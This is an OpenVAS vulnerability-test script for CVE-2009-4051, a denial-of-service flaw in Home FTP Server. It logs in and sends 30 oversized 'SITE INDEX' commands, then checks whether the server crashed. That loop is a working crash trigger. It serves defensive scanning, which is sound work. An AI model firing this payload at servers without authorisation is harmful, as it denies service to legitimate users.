###############################################################################
# OpenVAS Vulnerability Test
# $Id: home_ftp_server_37033.nasl 13210 2019-01-22 09:14:04Z cfischer $
#
# Home FTP Server 'SITE INDEX' Command Remote Denial of Service Vulnerability
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100351");
  script_version("$Revision: 13210 $");
  script_tag(name:"last_modification", value:"$Date: 2019-01-22 10:14:04 +0100 (Tue, 22 Jan 2019) $");
  script_tag(name:"creation_date", value:"2009-11-18 12:44:57 +0100 (Wed, 18 Nov 2009)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_cve_id("CVE-2009-4051");
  script_bugtraq_id(37033);

  script_name("Home FTP Server 'SITE INDEX' Command Remote Denial of Service Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/37033");
  script_xref(name:"URL", value:"http://downstairs.dnsalias.net/homeftpserver.html");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/507893");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_DENIAL);
  script_family("FTP");
  script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
  script_dependencies("ftpserver_detect_type_nd_version.nasl");
  script_require_ports("Services/ftp", 21);

  script_tag(name:"summary", value:"Home FTP Server is prone to a remote denial-of-service vulnerability
because it fails to handle user-supplied input.");

  script_tag(name:"impact", value:"Successfully exploiting this issue allows remote attackers to crash
the affected application, denying service to legitimate users.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  exit(0);
}

include("ftp_func.inc");

ftpPort = get_ftp_port(default:21);

soc1 = open_sock_tcp(ftpPort);
if(!soc1){
  exit(0);
}

domain = get_kb_item("Settings/third_party_domain");
if(!domain)
  domain = this_host_name();

user = get_kb_item("ftp/login");
pass = get_kb_item("ftp/password");

if(!user)user = "anonymous";
if(!pass)pass = string("vt-test@", domain);

login_details = ftp_log_in(socket:soc1, user:user, pass:pass);

if(login_details) {

  for(i=0; i<30; i++) {
    data = crap(length: (40*i));
    ftp_send_cmd(socket: soc1, cmd: string("SITE INDEX ",data));
  }

  close(soc1);
  sleep(3);
  soc = open_sock_tcp(ftpPort);

  if(!soc) {
    security_message(port:ftpPort);
    exit(0);
  }
}

exit(0);